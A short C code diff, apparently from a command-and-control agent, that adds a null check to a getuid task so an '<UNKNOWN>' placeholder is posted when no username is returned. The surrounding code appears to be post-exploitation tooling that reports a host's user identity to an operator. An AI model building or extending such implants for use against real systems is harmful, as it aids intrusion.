@@ -56,7 +56,11 @@ void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *username = cap->GetuidPicoEntrypoint();
 	
 	TaskPostReply reply = { 0 };
-	perform_post(state, task, &reply, username, "success"); // TODO check if username is null and perform post based on that
+	if (username != 0) {
+		perform_post(state, task, &reply, username, "success");
+	} else {
+		perform_post(state, task, &reply, "<UNKNOWN>", "success");
+	}
 	
 	#ifdef CELEBI_DEBUG
 	if (reply.success == 1) {
